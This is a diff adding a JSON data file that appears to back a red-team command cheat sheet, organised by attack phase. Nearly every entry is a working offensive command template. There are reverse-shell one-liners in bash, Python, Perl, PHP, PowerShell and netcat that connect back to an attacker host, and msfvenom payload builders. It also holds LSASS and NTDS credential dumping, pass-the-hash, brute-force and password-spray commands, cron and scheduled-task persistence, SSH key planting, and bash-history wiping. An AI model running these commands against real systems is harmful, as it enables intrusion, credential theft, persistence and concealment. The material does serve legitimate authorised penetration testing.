@@ -1,0 +1,543 @@
+{
+  "version": "1.0",
+  "label": "redteam",
+  "updatedDate": "2026.05.04",
+  "categories": [
+    {
+      "id": "redteam-creds",
+      "title": "Password Attacks",
+      "desc": "Hash cracking, online bruteforce, mutation for red-team workflows.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"8\" cy=\"10\" r=\"5\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><circle cx=\"8\" cy=\"10\" r=\"2\" stroke=\"#FCD200\" stroke-width=\"1.2\" opacity=\".5\"/><path d=\"M12.5 12.5L21 21\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><path d=\"M17 17l3-1M19 19l1-3\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-priv",
+      "items": [
+        {
+          "id": "redteam-creds-001",
+          "name": "Hashcat — NTLM (mode 1000)",
+          "description": "Wordlist + best64 ruleset.",
+          "template": "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+          "group": "Core Password Attacks"
+        },
+        {
+          "id": "redteam-creds-002",
+          "name": "Hashcat — Kerberos AS-REP (18200)",
+          "description": "Roastable accounts.",
+          "template": "hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule",
+          "group": "Core Password Attacks"
+        },
+        {
+          "id": "redteam-creds-003",
+          "name": "Hashcat — Kerberos TGS (13100)",
+          "description": "Kerberoast cracking.",
+          "template": "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
+          "group": "Core Password Attacks"
+        },
+        {
+          "id": "redteam-creds-004",
+          "name": "John the Ripper",
+          "description": "Format autodetect + rules.",
+          "template": "john --wordlist=rockyou.txt --rules=Jumbo hashes.txt",
+          "group": "Core Password Attacks"
+        },
+        {
+          "id": "redteam-creds-005",
+          "name": "Hydra — SSH bruteforce",
+          "description": "Throttled, with username list.",
+          "template": "hydra -L users.txt -P passwords.txt ssh://{RHOST} -t 4 -f",
+          "group": "Core Password Attacks"
+        },
+        {
+          "id": "redteam-creds-006",
+          "name": "Hydra — HTTP form",
+          "description": "POST login form bruteforce.",
+          "template": "hydra -l admin -P rockyou.txt {RHOST} http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'",
+          "group": "Core Password Attacks"
+        },
+        {
+          "id": "redteam-creds-007",
+          "name": "CeWL — site wordlist",
+          "description": "Build a custom wordlist from the site.",
+          "template": "cewl -d 2 -m 6 -w wl.txt {URL}",
+          "group": "Core Password Attacks"
+        },
+        {
+          "id": "redteam-creds-008",
+          "name": "hash-identifier / hashid",
+          "description": "Quickly classify unknown hashes.",
+          "template": "hashid -m hash.txt",
+          "group": "Core Password Attacks"
+        }
+      ]
+    },
+    {
+      "id": "redteam-exploit",
+      "title": "Exploitation",
+      "desc": "Public exploits, payloads, listeners, shells for red-team workflows.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"12\" cy=\"12\" r=\"3\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><path d=\"M12 2v5M12 17v5M2 12h5M17 12h5\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><circle cx=\"12\" cy=\"12\" r=\"8\" stroke=\"#FCD200\" stroke-width=\"1.2\" stroke-dasharray=\"3 3\"/></svg>",
+      "tag": "t-exploit",
+      "items": [
+        {
+          "id": "redteam-exploit-001",
+          "name": "searchsploit — local Exploit-DB",
+          "description": "Find PoCs by service banner.",
+          "template": "searchsploit \"vsftpd 2.3.4\" ; searchsploit -m linux/remote/49757.py",
+          "group": "Core Exploitation"
+        },
+        {
+          "id": "redteam-exploit-002",
+          "name": "msfvenom — Linux reverse shell ELF",
+          "description": "Standalone reverse shell binary.",
+          "template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf",
+          "group": "Core Exploitation"
+        },
+        {
+          "id": "redteam-exploit-003",
+          "name": "msfvenom — Windows reverse shell EXE",
+          "description": "x64, PE, simple.",
+          "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o sh.exe",
+          "group": "Core Exploitation"
+        },
+        {
+          "id": "redteam-exploit-004",
+          "name": "msfvenom — PHP webshell",
+          "description": "Drop into a writable webroot.",
+          "template": "msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -o shell.php",
+          "group": "Core Exploitation"
+        },
+        {
+          "id": "redteam-exploit-005",
+          "name": "netcat listener",
+          "description": "Classic catcher.",
+          "template": "nc -lvnp {LPORT}",
+          "group": "Core Exploitation"
+        },
+        {
+          "id": "redteam-exploit-006",
+          "name": "rlwrap + nc (better history)",
+          "description": "Arrow keys + tab completion in shell.",
+          "template": "rlwrap -cAr nc -lvnp {LPORT}",
+          "group": "Core Exploitation"
+        },
+        {
+          "id": "redteam-exploit-007",
+          "name": "Bash TTY upgrade",
+          "description": "After landing — get a real PTY.",
+          "template": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' ; export TERM=xterm ; stty raw -echo;fg",
+          "group": "Core Exploitation"
+        },
+        {
+          "id": "redteam-exploit-008",
+          "name": "PowerShell one-liner reverse shell",
+          "description": "Drop straight into a Win shell.",
+          "template": "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()}\"",
+          "group": "Core Exploitation"
+        }
+      ]
+    },
+    {
+      "id": "redteam-transfer",
+      "title": "File Transfer",
+      "desc": "Move tools to and from the target for red-team workflows.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"3\" y=\"4\" width=\"18\" height=\"16\" rx=\"2\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><path d=\"M8 12l4-4 4 4\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/><line x1=\"12\" y1=\"8\" x2=\"12\" y2=\"17\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-utility",
+      "items": [
+        {
+          "id": "redteam-transfer-001",
+          "name": "Python web server",
+          "description": "Quick HTTP server in your loot dir.",
+          "template": "python3 -m http.server 8000",
+          "group": "Core File Transfer"
+        },
+        {
+          "id": "redteam-transfer-002",
+          "name": "Linux — wget / curl",
+          "description": "Pull from your kit, save to /tmp.",
+          "template": "wget http://{LHOST}:8000/linpeas.sh -O /tmp/lp.sh ; curl -sSf http://{LHOST}:8000/lp.sh -o /tmp/lp.sh",
+          "group": "Core File Transfer"
+        },
+        {
+          "id": "redteam-transfer-003",
+          "name": "Windows — PowerShell IWR",
+          "description": "Download to disk.",
+          "template": "powershell -nop -c \"iwr http://{LHOST}:8000/winpeas.exe -OutFile C:\\Users\\Public\\wp.exe\"",
+          "group": "Core File Transfer"
+        },
+        {
+          "id": "redteam-transfer-004",
+          "name": "Windows — certutil",
+          "description": "LOLBin classic.",
+          "template": "certutil -urlcache -split -f http://{LHOST}:8000/nc.exe C:\\Windows\\Temp\\nc.exe",
+          "group": "Core File Transfer"
+        },
+        {
+          "id": "redteam-transfer-005",
+          "name": "SMB — impacket-smbserver",
+          "description": "Mount your loot as a share.",
+          "template": "impacket-smbserver share . -smb2support -username pent -password Pass123",
+          "group": "Core File Transfer"
+        },
+        {
+          "id": "redteam-transfer-006",
+          "name": "SCP",
+          "description": "When you have an SSH key.",
+          "template": "scp -i id_rsa user@{RHOST}:/etc/passwd ./loot/",
+          "group": "Core File Transfer"
+        }
+      ]
+    },
+    {
+      "id": "redteam-linprivesc",
+      "title": "Linux Privilege Escalation",
+      "desc": "sudo, SUID, kernel, cron, capabilities, paths for red-team workflows.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M12 3c-2.5 0-4.5 2-4.5 5v3c0 2-.8 3.5-2.5 5h14c-1.7-1.5-2.5-3-2.5-5V8c0-3-2-5-4.5-5z\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linejoin=\"round\"/><circle cx=\"10\" cy=\"8\" r=\"1\" fill=\"#FCD200\"/><circle cx=\"14\" cy=\"8\" r=\"1\" fill=\"#FCD200\"/><path d=\"M10 11h4\" stroke=\"#FCD200\" stroke-width=\"1\" stroke-linecap=\"round\"/><path d=\"M7 16l-1.5 4M17 16l1.5 4\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><line x1=\"5.5\" y1=\"20\" x2=\"9\" y2=\"20\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/><line x1=\"15\" y1=\"20\" x2=\"18.5\" y2=\"20\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-priv",
+      "items": [
+        {
+          "id": "redteam-linprivesc-001",
+          "name": "linpeas.sh",
+          "description": "All-in-one privesc enumerator.",
+          "template": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+          "group": "Core Linux Privilege Escalation"
+        },
+        {
+          "id": "redteam-linprivesc-002",
+          "name": "sudo -l",
+          "description": "What can you run as root?",
+          "template": "sudo -l",
+          "group": "Core Linux Privilege Escalation"
+        },
+        {
+          "id": "redteam-linprivesc-003",
+          "name": "SUID binaries",
+          "description": "Anything outside the usual list = candidate.",
+          "template": "find / -perm -4000 -type f 2>/dev/null",
+          "group": "Core Linux Privilege Escalation"
+        },
+        {
+          "id": "redteam-linprivesc-004",
+          "name": "Capabilities",
+          "description": "+ep on something weird = privesc.",
+          "template": "getcap -r / 2>/dev/null",
+          "group": "Core Linux Privilege Escalation"
+        },
+        {
+          "id": "redteam-linprivesc-005",
+          "name": "World-writable in PATH",
+          "description": "Hijack a binary you can rewrite.",
+          "template": "find / -writable -type d 2>/dev/null ; echo $PATH",
+          "group": "Core Linux Privilege Escalation"
+        },
+        {
+          "id": "redteam-linprivesc-006",
+          "name": "GTFOBins lookup",
+          "description": "Local copy or web — abuse the binary.",
+          "template": "xdg-open https://gtfobins.github.io/#$(which BINARY)",
+          "group": "Core Linux Privilege Escalation"
+        },
+        {
+          "id": "redteam-linprivesc-007",
+          "name": "Cron — writable jobs",
+          "description": "Look for tasks running as root that you can edit.",
+          "template": "cat /etc/crontab ; ls -la /etc/cron.* /var/spool/cron/* 2>/dev/null",
+          "group": "Core Linux Privilege Escalation"
+        },
+        {
+          "id": "redteam-linprivesc-008",
+          "name": "pspy — passive proc watcher",
+          "description": "Watch for cron/interactive root tasks.",
+          "template": "./pspy64 -pf -i 1000",
+          "group": "Core Linux Privilege Escalation"
+        }
+      ]
+    },
+    {
+      "id": "redteam-winprivesc",
+      "title": "Windows Privilege Escalation",
+      "desc": "Tokens, services, AlwaysInstallElevated, paths for red-team workflows.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M3 5.5l8-1.2v7.2H3V5.5z\" stroke=\"#FCD200\" stroke-width=\"1.4\" stroke-linejoin=\"round\"/><path d=\"M13 3.8l8-1.3v9H13V3.8z\" stroke=\"#FCD200\" stroke-width=\"1.4\" stroke-linejoin=\"round\"/><path d=\"M3 13h8v7.2l-8-1.2V13z\" stroke=\"#FCD200\" stroke-width=\"1.4\" stroke-linejoin=\"round\"/><path d=\"M13 13h8v9l-8-1.3V13z\" stroke=\"#FCD200\" stroke-width=\"1.4\" stroke-linejoin=\"round\"/></svg>",
+      "tag": "t-priv",
+      "items": [
+        {
+          "id": "redteam-winprivesc-001",
+          "name": "winPEAS",
+          "description": "Run from local copy after transfer.",
+          "template": "C:\\Users\\Public\\winPEASx64.exe quiet cmd",
+          "group": "Core Windows Privilege Escalation"
+        },
+        {
+          "id": "redteam-winprivesc-002",
+          "name": "whoami /priv & /groups",
+          "description": "Look for SeImpersonate, SeBackup, etc.",
+          "template": "whoami /all",
+          "group": "Core Windows Privilege Escalation"
+        },
+        {
+          "id": "redteam-winprivesc-003",
+          "name": "Service permissions — accesschk",
+          "description": "Modifiable services.",
+          "template": "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
+          "group": "Core Windows Privilege Escalation"
+        },
+        {
+          "id": "redteam-winprivesc-004",
+          "name": "Unquoted service paths",
+          "description": "Classic Windows misconfig.",
+          "template": "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"",
+          "group": "Core Windows Privilege Escalation"
+        },
+        {
+          "id": "redteam-winprivesc-005",
+          "name": "AlwaysInstallElevated",
+          "description": "Both keys = SYSTEM via MSI.",
+          "template": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated ; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+          "group": "Core Windows Privilege Escalation"
+        },
+        {
+          "id": "redteam-winprivesc-006",
+          "name": "PrintNightmare / PrintSpoofer / SeImpersonate",
+          "description": "SeImpersonate → SYSTEM.",
+          "template": "PrintSpoofer.exe -i -c cmd",
+          "group": "Core Windows Privilege Escalation"
+        },
+        {
+          "id": "redteam-winprivesc-007",
+          "name": "Stored creds — cmdkey & files",
+          "description": "Find saved RDP/SMB creds.",
+          "template": "cmdkey /list ; findstr /SI /M \"password\" *.xml *.ini *.txt",
+          "group": "Core Windows Privilege Escalation"
+        }
+      ]
+    },
+    {
+      "id": "redteam-ad",
+      "title": "Active Directory",
+      "desc": "Kerberos, ACL abuse, BloodHound for red-team workflows.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"4\" y=\"4\" width=\"16\" height=\"17\" rx=\"1.5\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><rect x=\"7\" y=\"7\" width=\"3.5\" height=\"3\" rx=\".5\" stroke=\"#FCD200\" stroke-width=\"1.2\"/><rect x=\"13.5\" y=\"7\" width=\"3.5\" height=\"3\" rx=\".5\" stroke=\"#FCD200\" stroke-width=\"1.2\"/><rect x=\"7\" y=\"13\" width=\"3.5\" height=\"3\" rx=\".5\" stroke=\"#FCD200\" stroke-width=\"1.2\"/><rect x=\"13.5\" y=\"13\" width=\"3.5\" height=\"3\" rx=\".5\" stroke=\"#FCD200\" stroke-width=\"1.2\"/><line x1=\"12\" y1=\"18\" x2=\"12\" y2=\"21\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-priv",
+      "items": [
+        {
+          "id": "redteam-ad-001",
+          "name": "BloodHound — collection (SharpHound)",
+          "description": "All collection methods, ZIP output.",
+          "template": "SharpHound.exe -c All --zipfilename loot.zip",
+          "group": "Core Active Directory"
+        },
+        {
+          "id": "redteam-ad-002",
+          "name": "BloodHound — Linux (bloodhound.py)",
+          "description": "From an attacker box with creds.",
+          "template": "bloodhound-python -u user -p '{PASS}' -d {DOMAIN} -ns {RHOST} -c All",
+          "group": "Core Active Directory"
+        },
+        {
+          "id": "redteam-ad-003",
+          "name": "Kerberoast — GetUserSPNs",
+          "description": "Crackable TGS for SPN-bearing users.",
+          "template": "impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {RHOST} -request -outputfile tgs.txt",
+          "group": "Core Active Directory"
+        },
+        {
+          "id": "redteam-ad-004",
+          "name": "ASREPRoast",
+          "description": "Users without pre-auth.",
+          "template": "impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -no-pass -dc-ip {RHOST}",
+          "group": "Core Active Directory"
+        },
+        {
+          "id": "redteam-ad-005",
+          "name": "Password spray — nxc",
+          "description": "Slow, smart, lockout-aware.",
+          "template": "nxc smb {RHOST} -u users.txt -p 'Spring2026!' --continue-on-success",
+          "group": "Core Active Directory"
+        },
+        {
+          "id": "redteam-ad-006",
+          "name": "DCSync — secretsdump",
+          "description": "Dump NTDS hashes once you have replication rights.",
+          "template": "impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{RHOST} -just-dc",
+          "group": "Core Active Directory"
+        },
+        {
+          "id": "redteam-ad-007",
+          "name": "Pass-the-Hash — psexec",
+          "description": "NTLM hash → SYSTEM shell.",
+          "template": "impacket-psexec {DOMAIN}/{USER}@{RHOST} -hashes :{HASH}",
+          "group": "Core Active Directory"
+        },
+        {
+          "id": "redteam-ad-008",
+          "name": "Silver / Golden ticket",
+          "description": "Forge a TGS / TGT — rubeus or ticketer.",
+          "template": "impacket-ticketer -nthash NT -domain-sid S-1-5-21-... -domain {DOMAIN} Administrator",
+          "group": "Core Active Directory"
+        }
+      ]
+    },
+    {
+      "id": "redteam-pivot",
+      "title": "Pivoting & Tunneling",
+      "desc": "Reach internal networks through a foothold for red-team workflows.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"4\" cy=\"12\" r=\"2.5\" stroke=\"#FCD200\" stroke-width=\"1.4\"/><circle cx=\"12\" cy=\"5\" r=\"2.5\" stroke=\"#FCD200\" stroke-width=\"1.4\"/><circle cx=\"12\" cy=\"19\" r=\"2.5\" stroke=\"#FCD200\" stroke-width=\"1.4\"/><circle cx=\"20\" cy=\"12\" r=\"2.5\" stroke=\"#FCD200\" stroke-width=\"1.4\"/><path d=\"M6.3 11L9.5 6.5M6.3 13l3.2 4.5M14.5 6.5l3.2 4.5M14.5 17.5l3.2-4.5\" stroke=\"#FCD200\" stroke-width=\"1.2\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-post",
+      "items": [
+        {
+          "id": "redteam-pivot-001",
+          "name": "Chisel — reverse SOCKS",
+          "description": "Server on attacker, client on target.",
+          "template": "# attacker: ./chisel server -p 8000 --reverse\\n# target:   ./chisel client {LHOST}:8000 R:1080:socks",
+          "group": "Core Pivoting & Tunneling"
+        },
+        {
+          "id": "redteam-pivot-002",
+          "name": "SSH dynamic SOCKS",
+          "description": "When you have SSH on a pivot host.",
+          "template": "ssh -D 1080 -N -f user@pivot.target",
+          "group": "Core Pivoting & Tunneling"
+        },
+        {
+          "id": "redteam-pivot-003",
+          "name": "SSH local port forward",
+          "description": "Bring an internal port to your localhost.",
+          "template": "ssh -L 8081:10.0.0.5:80 user@pivot.target",
+          "group": "Core Pivoting & Tunneling"
+        },
+        {
+          "id": "redteam-pivot-004",
+          "name": "sshuttle — VPN-like",
+          "description": "Route a CIDR through SSH.",
+          "template": "sshuttle -r user@pivot.target 10.0.0.0/24",
+          "group": "Core Pivoting & Tunneling"
+        },
+        {
+          "id": "redteam-pivot-005",
+          "name": "proxychains",
+          "description": "Send tools through your SOCKS.",
+          "template": "proxychains -q nmap -sT -Pn -n -p 80,445 10.0.0.5",
+          "group": "Core Pivoting & Tunneling"
+        },
+        {
+          "id": "redteam-pivot-006",
+          "name": "Ligolo-ng",
+          "description": "Modern TUN-mode pivoting.",
+          "template": "# proxy: ./proxy -selfcert\\n# agent: ./agent -connect {LHOST}:11601 -ignore-cert",
+          "group": "Core Pivoting & Tunneling"
+        }
+      ]
+    },
+    {
+      "id": "redteam-post",
+      "title": "Post-Exploitation",
+      "desc": "Persistence, dumping, situational awareness for red-team workflows.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M9 3h6v5l4 9c.5 1-.2 2.2-1.3 2.2H6.3C5.2 19.2 4.5 18 5 17l4-9V3z\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linejoin=\"round\"/><line x1=\"9\" y1=\"3\" x2=\"15\" y2=\"3\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><line x1=\"7\" y1=\"15\" x2=\"17\" y2=\"15\" stroke=\"#FCD200\" stroke-width=\"1\" opacity=\".5\"/><circle cx=\"10\" cy=\"17\" r=\"1\" fill=\"#FCD200\" opacity=\".6\"/><circle cx=\"14\" cy=\"16.5\" r=\".7\" fill=\"#FCD200\" opacity=\".6\"/></svg>",
+      "tag": "t-post",
+      "items": [
+        {
+          "id": "redteam-post-001",
+          "name": "Linux — persistence via cron",
+          "description": "Quick & dirty back-door.",
+          "template": "(crontab -l;echo '*/5 * * * * /tmp/.x.sh')|crontab -",
+          "group": "Core Post-Exploitation"
+        },
+        {
+          "id": "redteam-post-002",
+          "name": "Linux — SSH key drop",
+          "description": "Authorize a key you control.",
+          "template": "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-ed25519 AAA...' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
+          "group": "Core Post-Exploitation"
+        },
+        {
+          "id": "redteam-post-003",
+          "name": "Windows — scheduled task persistence",
+          "description": "Run on logon as user.",
+          "template": "schtasks /create /tn \"Updater\" /tr \"C:\\Users\\Public\\b.exe\" /sc onlogon /rl HIGHEST /f",
+          "group": "Core Post-Exploitation"
+        },
+        {
+          "id": "redteam-post-004",
+          "name": "Mimikatz — sekurlsa",
+          "description": "Dump creds from LSASS (admin needed).",
+          "template": "privilege::debug ; sekurlsa::logonpasswords",
+          "group": "Core Post-Exploitation"
+        },
+        {
+          "id": "redteam-post-005",
+          "name": "LSASS dump (procdump)",
+          "description": "Crash-free dump for offline parsing.",
+          "template": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+          "group": "Core Post-Exploitation"
+        },
+        {
+          "id": "redteam-post-006",
+          "name": "PowerView — domain context",
+          "description": "Recon from the inside.",
+          "template": "Import-Module .\\PowerView.ps1 ; Get-NetUser -SPN | select samaccountname,serviceprincipalname",
+          "group": "Core Post-Exploitation"
+        },
+        {
+          "id": "redteam-post-007",
+          "name": "Linux — cleanup",
+          "description": "Clear bash history & timestamps.",
+          "template": "unset HISTFILE ; export HISTSIZE=0 ; cat /dev/null > ~/.bash_history && history -c",
+          "group": "Core Post-Exploitation"
+        }
+      ]
+    },
+    {
+      "id": "redteam-shells",
+      "title": "Reverse Shells",
+      "desc": "One-liners across languages for red-team workflows.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M12 3C7.5 3 4 6.5 4 10.5c0 2.5 1.2 4.5 3 5.8V18h10v-1.7c1.8-1.3 3-3.3 3-5.8C20 6.5 16.5 3 12 3z\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linejoin=\"round\"/><circle cx=\"9\" cy=\"10\" r=\"2\" stroke=\"#FCD200\" stroke-width=\"1.3\"/><circle cx=\"15\" cy=\"10\" r=\"2\" stroke=\"#FCD200\" stroke-width=\"1.3\"/><path d=\"M10 15v3M12 15v3M14 15v3\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-access",
+      "items": [
+        {
+          "id": "redteam-shells-001",
+          "name": "Bash /dev/tcp",
+          "description": "No interpreter beyond bash.",
+          "template": "bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'",
+          "group": "Core Reverse Shells"
+        },
+        {
+          "id": "redteam-shells-002",
+          "name": "Python3",
+          "description": "Cross-distro.",
+          "template": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/bash\",\"-i\"])'",
+          "group": "Core Reverse Shells"
+        },
+        {
+          "id": "redteam-shells-003",
+          "name": "Perl",
+          "description": "Old, reliable.",
+          "template": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'",
+          "group": "Core Reverse Shells"
+        },
+        {
+          "id": "redteam-shells-004",
+          "name": "PHP",
+          "description": "Useful from a webshell pivot.",
+          "template": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
+          "group": "Core Reverse Shells"
+        },
+        {
+          "id": "redteam-shells-005",
+          "name": "nc traditional",
+          "description": "Old netcat with -e.",
+          "template": "nc -e /bin/bash {LHOST} {LPORT}",
+          "group": "Core Reverse Shells"
+        },
+        {
+          "id": "redteam-shells-006",
+          "name": "nc fifo (no -e)",
+          "description": "When -e is stripped.",
+          "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
+          "group": "Core Reverse Shells"
+        },
+        {
+          "id": "redteam-shells-007",
+          "name": "Socat — full TTY",
+          "description": "Best stability after upgrade.",
+          "template": "socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}  # listener\\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}  # target",
+          "group": "Core Reverse Shells"
+        }
+      ]
+    }
+  ]
+}
